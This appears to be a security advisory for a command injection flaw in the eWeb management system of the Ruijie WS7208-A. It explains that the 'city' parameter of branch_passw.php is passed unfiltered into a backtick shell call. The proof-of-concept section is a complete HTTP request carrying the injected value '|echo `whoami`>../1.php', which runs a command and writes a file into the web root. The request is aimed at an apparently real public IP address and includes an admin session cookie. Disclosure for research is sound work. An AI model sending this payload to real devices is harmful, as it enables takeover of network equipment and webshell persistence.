# Ruijie WS7208-A eWeb Network Management System Command Execution Vulnerability

## 漏洞概述

Ruijie Networks is a professional provider of switches, routers, security devices and network solutions. There is a command execution vulnerability in the eWeb management system used by its WS7208-A device.

An attacker, when logged into the system, can exploit the issue of parameters not being securely filtered by crafting malicious requests, executing arbitrary system commands on the server, which may ultimately lead to server privileges being obtained and the device being completely compromised.

This vulnerability is the result of a code audit and does not involve mass Internet scanning or public cases. The document content is intended solely for security research and learning.

---

## Vulnerability information

- Vulnerability Type: Command Injection
- Affected Product: Ruijie WS7208-A
- Affected System: eWeb Management System
- Vulnerable File: /itbox_pi/branch_passw.php
- Trigger Condition: Logged into the backend
- Risk Level: High
- Method of Discovery: Code Audit

---

## Vulnerability impact

After successfully exploiting this vulnerability, an attacker may cause the following impacts: - Execute arbitrary system commands on the server - Write a WebShell to gain persistent control - Completely seize device management privileges - Leak device configuration and sensitive information - Provide an entry point for subsequent lateral attacks within the internal network

---

## Analysis of Vulnerability Principles

In the `listAction()` method of the `branch_passw.php` file, the `city` parameter comes directly from the user request without any validity checks or filtering. This parameter is directly concatenated into a system command and executed using PHP backtick syntax. If the parameter contains Shell special characters such as pipes or redirection symbols, it can lead to command injection and execution, thereby creating a command execution vulnerability.

##POC
POST /itbox_pi/branch_passw.php?a=list HTTP/1.1
Host: 61.162.225.232:4430
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=656v9k5tgud3cbml1b9u66pn93; user=admin; mac=c470.abe6.ad74
Content-Length: 28
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: https://61.162.225.232:4430
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://61.162.225.232:4430/cache.htm
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

city=|echo `whoami`>../1.php

